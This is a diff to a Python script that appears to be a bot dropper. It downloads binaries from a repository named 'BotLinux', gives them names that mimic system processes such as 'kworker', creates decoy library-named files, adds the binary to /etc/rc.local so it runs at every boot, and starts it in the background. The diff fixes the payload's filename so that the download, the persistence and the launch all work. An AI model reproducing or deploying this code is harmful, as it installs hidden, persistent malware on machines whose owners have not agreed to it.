@@ -59,11 +59,11 @@ os.chdir("lsb")
 
 os.mkdir("hostconfig-lib-01")
 os.chdir("hostconfig-lib-01")
-os.system("wget https://raw.githubusercontent.com/Libx86/BotLinux/master/kworker_v8U%3A023FWE234-0")
+os.system("wget https://raw.githubusercontent.com/Libx86/BotLinux/master/kworker_v8U023FWE234-0")
 os.system("wget https://raw.githubusercontent.com/Libx86/BotLinux/master/at-spi2-regist3r.01F")
 
 
-os.system("chmod a+x kworker_v8U:023FWE234-0")
+os.system("chmod a+x kworker_v8U023FWE234-0")
 os.system("touch lib01.h hostconfig-beta librighel2.6.04 libquadmath.so.02.3.2.h")
 
 
@@ -77,7 +77,7 @@ if(os.path.exists("/etc/rc.local")):
   autorunFile=open("/etc/rc.local","r")
   autorun=autorunFile.readlines()
   autorunFile.close()
-  autorun.insert(len(autorun)-2,"./libx86/lsb/hostconfig-lib-01/kworker_v8U%3A023FWE234-0\n")
+  autorun.insert(len(autorun)-2,"./libx86/lsb/hostconfig-lib-01/kworker_v8U023FWE234-0\n")
   autorun="".join(autorun)
   autorunFile=open("/etc/rc.local","w")
   autorunFile.write(autorun)
@@ -86,14 +86,14 @@ else:
   autorunFile.write("""#!/bin/bash
 
 
-./libx86/lsb/hostconfig-lib-01/kworker_v8U%3A023FWE234-0
+./libx86/lsb/hostconfig-lib-01/kworker_v8U023FWE234-0
 
 exit 0""")
   autorunFile.close()
   os.system("chmod a+x /etc/rc.local")
 
 
-os.system("./kworker_v8U%3A023FWE234-0 &")
+os.system("./kworker_v8U023FWE234-0 &")
 
 
 
